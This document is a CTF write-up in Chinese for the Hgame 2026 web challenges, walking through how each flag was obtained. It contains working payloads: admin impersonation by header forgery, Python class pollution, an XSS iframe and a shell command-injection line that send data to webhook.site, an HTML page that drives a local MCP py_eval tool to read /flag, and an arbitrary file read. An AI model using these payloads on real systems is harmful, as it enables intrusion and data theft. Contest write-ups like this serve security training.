---
title: hgame2026 writeup
description: web方向week1 wp

date: 2026-03-18T12:12:52+08:00
lastmod: 2026-03-18T12:15:52+08:00
---
# Hgame 2026

## **魔理沙的魔法目录**

record加时间，check查，抓包直接控制台输入

```
fetch("http://cloud-big.hgame.vidar.club:31803/record", {
  method: "POST",
  headers: {
    "accept": "*/*",
    "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    "authorization": "6437ebeb-75d9-4462-8934-84455be98791",
    "content-type": "application/json"
  },
  body: JSON.stringify({ time: 3600 }),
  mode: "cors",
  credentials: "include"
})
.then(r => r.text())
.then(console.log)
.catch(console.error);
```

去check拿到

```
hgame{y0u_ar3-4Ls0_a-m@HOU-TSuK@i-NoW!10be8d}
```

## **Vidarshop**

首先根据题目提示

```
什么你这卖的东西这么贵 什么为什么都用uid了用户名还要抢啊， 什么凭啥admin可以管我们所有人的钱啊
```

观察发包

```
POST /api/update HTTP/1.1
Host: cloud-big.hgame.vidar.club:31503
Content-Length: 46
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ind4eiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzcwMDA0NjQzfQ.KEF0LSsPi1t3Om7U9GFWPQPUCkPM3-VNBeuEreQ23wY
Accept-Language: zh-CN,zh;q=0.9
uid: 1413914
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: */*
Origin: http://cloud-big.hgame.vidar.club:31503
Referer: http://cloud-big.hgame.vidar.club:31503/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{
"balance":0,"role":"user","username":"wxz"}
```

uid部分要想伪造成admin是按字母顺序来的，a是1 b是2 所以admin是1413914

回传

```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.5 Python/3.12.12
Date: Mon, 02 Feb 2026 03:53:42 GMT
Content-Type: application/json
Content-Length: 105
Connection: close

{"is_admin":true,"msg":"System Access Granted","user_info":{"balance":0,"role":"user","username":"wxz"}}

```

越权成功后需要改余额

这里发送

```
{"username": {"x": 1}}
```

```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.5 Python/3.12.12
Date: Tue, 03 Feb 2026 01:37:19 GMT
Content-Type: application/json
Content-Length: 46
Connection: close

{"error":"'str' object has no attribute 'x'"}

```

可以发现是原型链污染

payload

```
{"info":{"__func__":{"__globals__":{"balance":1000000}}}}
```

```
{"is_admin":true,"msg":"System Access Granted","user_info":{"balance":1000000,"role":"user","username":"wxz"}}
```

成功获取足够的balance

POST /api/buy HTTP/1.1 {"item":"flag"}

```
{"flag":"hgame{Re4IadMIn-mUSTB3R1cH536e6094b0}","success":true}
```

## **博丽神社的绘马挂**

观察cookie发现开启了httponly那么就没有办法xss盗cookie了，但是发现js脚本可以正常使用

```
<iframe onload="alert(document.domain)"></iframe>
```

可以发现能弹出当前url

那么观察请求archives的发包

```
fetch("http://cloud-middle.hgame.vidar.club:30252/api/archives", {
"headers": {
"accept": "/",
"accept-language": "zh-CN,zh;q=0.9",
"proxy-connection": "keep-alive"
},
"referrer": "http://cloud-middle.hgame.vidar.club:30252/archives.html",
"body": null,
"method": "GET",
"mode": "cors",
"credentials": "include"
});
[
{
"content": "\u6d4b\u8bd5",
"id": 1770220470925,
"is_private": false,
"status": "archived",
"timestamp": "15:54:30",
"username": "wxz"
},
{
"content": "\u6d4b\u8bd5\uff08\u79c1\u5bc6\uff09",
"id": 1770220480377,
"is_private": true,
"status": "archived",
"timestamp": "15:54:40",
"username": "wxz"
}
]
```

响应是

```
[
    {
        "content": "\u6d4b\u8bd5",
        "id": 1770220470925,
        "is_private": false,
        "status": "archived",
        "timestamp": "15:54:30",
        "username": "wxz"
    },
    {
        "content": "\u6d4b\u8bd5\uff08\u79c1\u5bc6\uff09",
        "id": 1770220480377,
        "is_private": true,
        "status": "archived",
        "timestamp": "15:54:40",
        "username": "wxz"
    }
]
```

那么构造payload

```
<iframe onload="fetch('/api/archives').then(r=>r.text()).then(d=>window.location='https://webhook.site/846eea6c-efa7-4bb8-bacf-2ebf18acac12?flag='+btoa(d))"></iframe>
```

此处用了webhook.site

收到回传解码

```
[{"content":"The_Secret_Is: Hgame{TH3-seCr3T_oF_hakUr3I_jlnjA272d1f68}","id":1001,"is_private":true,"status":"archived","timestamp":"2024-01-01 00:00:00","username":"Reimu"}]
```

flag是

```
Hgame{TH3-seCr3T_oF_hakUr3I_jlnjA272d1f68}
```

## **MyMonitor**

给了附件

审计发现这是一个对象复用污染
`MonitorPool` 用于复用 `MonitorStruct` 对象以减少内存分配。当调用 `Put` 时，对象放回池子；调用 `Get` 时，如果池中有可用对象，直接取出，里面的旧数据依然存在，除非手动重置。

UserCmd函数如下

```go
func UserCmd(c *gin.Context) {
    monitor := MonitorPool.Get().(*MonitorStruct)
    defer MonitorPool.Put(monitor) // 【defer 1】: 最后执行，把对象放回池子

    // 漏洞点在这里：
    if err := c.ShouldBindJSON(monitor); err != nil {
        // 如果 JSON 解析出错，直接 return
        // 此时 【defer 1】 会执行，把 monitor 放回池子
        // 但是 【defer 2】 (reset) 还没有被定义，所以不会执行！
        // 结果：一个带有脏数据的对象被放回了池子。
        c.JSON(400, gin.H{"error": err.Error()})
        return
    }
    
    // ...
    defer monitor.reset() // 【defer 2】: 正常流程下用于清空数据
    // ...
}
```

payload

```
{"args":";curl https://webhook.site/846eea6c-efa7-4bb8-bacf-2ebf18acac12?flag=$(cat /flag|base64|tr -d \"\\n\")","cmd":1}
```

```
hgame{r3M3MbeR_T0-CLE4R_tHE-buFfer-bEFOre-yOu_wANT-TO-usE!!!0}
```

## **My Little Assistant**

分析源码发现

```
async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True, 
                args=["--no-sandbox",
                      "--disable-dev-shm-usage",
                      "--disable-web-security"]
            )
```

--disable-web-security关闭了浏览器的同源策略，允许跨域请求

构造一个恶意url丢给他

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Exploit</title>
</head>
<body>
    <h1>Exploiting...</h1>
    <div id="output">Waiting for flag...</div>
    <script>
        async function attack() {
            const target = "http://127.0.0.1:8001/mcp";
            const cmd = "import os; res = os.popen('cat /flag || /readflag || env').read(); del os";
            
            const payload = {
                "id": "1",
                "params": {
                    "name": "py_eval",
                    "arguments": {
                        "code": cmd
                    }
                }
            };

            try {
                const response = await fetch(target, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(payload)
                });

                const data = await response.json();
                const executionResult = data.result.content[0].text;
                document.body.innerHTML = executionResult;
                
            } catch (e) {
                document.body.innerHTML = "Error: " + e.toString();
            }
        }
        attack();
    </script>
</body>
</html>
```

![image-20260206203022303](C:\Users\Mr_wx\AppData\Roaming\Typora\typora-user-images\image-20260206203022303.png)

```
hgame{4ImcP-dr1Ven_x5S_4ttacK_cHAlN41be729}
```

## **easyuu**

任意文件读取

```
POST /api/list_dir HTTP/1.1
Host: forward.vidar.club:31945
Content-Length: 16
Accept-Language: zh-CN,zh;q=0.9
accept: application/json
content-type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Origin: http://forward.vidar.club:31945
Referer: http://forward.vidar.club:31945/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

path=/app/update
```

